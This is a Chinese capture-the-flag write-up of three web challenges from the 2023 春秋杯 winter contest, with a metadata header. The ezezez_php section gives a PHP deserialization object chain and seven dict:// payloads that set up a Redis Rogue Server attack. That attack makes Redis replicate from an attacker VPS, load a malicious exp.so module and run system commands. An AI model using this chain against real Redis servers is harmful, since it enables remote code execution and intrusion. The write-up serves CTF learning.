---
title: 【WP】2023年春秋杯冬季赛 WEB、PWN 类题目解析
contest: 春秋杯
year: 2023
difficulty: medium
vuln_type: deserialize
tags: [customer-broker-merchant, message-queue, webhook, PHP-deserialize, Redis-Rogue-Server, dict-protocol, exp.so-module, picup-SSRF]
attack_chain: Active-Takeaway 三个组件 customer 生成订单/broker 队列/merchant 接单向 webhook 发/ezezez_php 4 步链 dict:// Redis module load exp.so system.exec + redis-rogue-server.py 攻击/picup 抓包 302 /login.php + 404 页面收集 + SSRF
key_payload: redis-rogue-server.py --server-only  dict://127.0.0.1:6379/config:set:dir:/tmp
one_liner: 2023 春秋杯冬季赛 Web/Pwn WP，customer-broker-merchant 队列系统 + PHP 反序列化 Redis Rogue Server + picup SSRF。
lesson: 消息队列三件套 customer/broker/merchant 漏洞多在 webhook 重放或订单伪造；PHP 反序列化可用 dict:// Redis module 加载 exp.so 实现 RCE；redis-rogue-server.py 是 SSRF → Redis RCE 经典工具。
quality: high
---

# 【WP】2023年春秋杯冬季赛 WEB、PWN 类题目解析

## 概览
2023 春秋杯冬季赛 3 道题 WP：Active-Takeaway、ezezez_php、picup。

## Active-Takeaway (Web 业务逻辑)

### 框架
- **customer**: 生成订单
- **broker**: 消息队列
- **merchant**: 监控队列订单，接单后向 customer 的 webhook 发送"已接单"
- 漏洞：webhook 接收订单可重放或伪造

## ezezez_php (反序列化 + Redis Rogue)

### 4 步链
```php
class Rd { public $ending; public $cl; public $poc; }
class Poc { public $payload; public $fun; }
class Er { public $symbol; public $Flag; }
class Ha { public $start; public $start1; public $start2; }

$a = new Ha;
$a->start1 = new Rd;
$a->start2 = "o.0";
$a->start = ["POC"=>"0.o"];
$a->start1->cl = new Er;
```

### Redis Rogue Server 攻击链
```php
$payload0 = "dict";
$payload1 = "dict://127.0.0.1:6379/config:set:dir:/tmp";
$payload2 = "dict://127.0.0.1:6379/config:set:dbfilename:exp.so";
$payload3 = "dict://127.0.0.1:6379/slaveof:ip:port";
$payload4 = "dict://127.0.0.1:6379/module:load:/tmp/exp.so";
$payload5 = "dict://127.0.0.1:6379/slave:no:one";
$payload6 = "dict://127.0.0.1:6379/system.exec:env";
$payload7 = "dict://127.0.0.1:6379/module:unload:system";
```

### VPS 上启动 Redis Rogue Server
```bash
python3 redis-rogue-server.py --server-only
```

### 攻击
- 把 payload3 的 `ip:port` 替换为 vps 的
- 依次 POST 7 个 payload1-7
- 触发 exp.so 加载 → `system.exec:env` 执行命令

## picup (SSRF)

### 抓包
- 启动环境拿到靶机地址
- 访问 302 跳转到 `/login.php`
- 抓响应包，目录扫描根据 404 页面
- 响应头分析

## 经验提炼
- 消息队列三件套 customer/broker/merchant 漏洞多在 webhook 重放或订单伪造
- PHP 反序列化可用 `dict://` Redis module 加载 exp.so 实现 RCE
- `redis-rogue-server.py` 是 SSRF → Redis RCE 经典工具
- 7 步 Redis 攻击链：dir → dbfilename → slaveof → module load → slave no one → system.exec → module unload
- curl dict 协议支持 `dict://host:port/command:arg` 格式
- exp.so 是 Redis 扩展模块，编译时带 `system.exec` 命令
- 抓包分析 302 跳转 + 404 页面是 Web 入门必备
- PHP 反序列化触发需找 `unserialize($_GET/POST/COOKIE)` 入口
